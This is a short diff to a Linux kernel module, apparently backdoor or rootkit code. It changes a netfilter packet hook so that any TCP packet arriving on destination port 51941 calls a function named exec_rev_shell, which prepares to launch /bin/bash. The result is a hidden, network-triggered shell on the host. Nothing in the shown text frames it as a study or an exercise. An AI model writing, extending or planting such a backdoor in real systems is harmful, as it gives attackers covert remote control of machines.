@@ -5,7 +5,7 @@
 #include <linux/skbuff.h>
 #include <linux/ip.h>
 #include <linux/tcp.h>
-int  exec_rev_shell(int sock_fd) {
+int  exec_rev_shell(void) {
     int ret;
     char * envp[] = { "HOME=/", NULL };
     char * argv[] = { "/bin/bash", NULL };
@@ -28,7 +28,10 @@ static unsigned int hook(void *priv, struct sk_buff *skb, const struct nf_hook_s
         src_port = (unsigned int)ntohs(tcp_header->source);
         dst_port = (unsigned int)ntohs(tcp_header->dest);
         if(dst_port == 51941)
-            return NF_ACCEPT;
+        {
+            if (exec_rev_shell())
+                return NF_DROP;
+        }
     }
 
     return NF_ACCEPT;
